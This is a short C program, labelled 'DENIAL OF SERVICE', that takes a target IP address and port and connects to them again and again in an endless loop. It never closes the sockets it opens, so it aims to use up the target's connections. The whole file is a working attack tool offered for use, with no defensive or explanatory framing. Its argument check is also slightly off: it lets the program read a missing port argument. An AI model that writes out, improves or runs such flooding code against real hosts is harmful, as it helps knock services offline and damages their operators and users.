#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]){
	if(argc < 2){
		printf("DENIAL OF SERVICE\n");
		printf("./DoS TARGET_IP SERVICE_PORT\n");
	} else {
		char *ip = argv[1];
		int port = atoi(argv[2]);

		struct sockaddr_in target;
		target.sin_family = AF_INET;
		target.sin_addr.s_addr = inet_addr(ip);
		target.sin_port = htons(port);

		while(1){
			int sock = socket(AF_INET, SOCK_STREAM, 0);

			if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0){
				printf("DENYING SERVICE ON %s:%d\n", ip, port);
			}
		}

	}
	return 0;
}
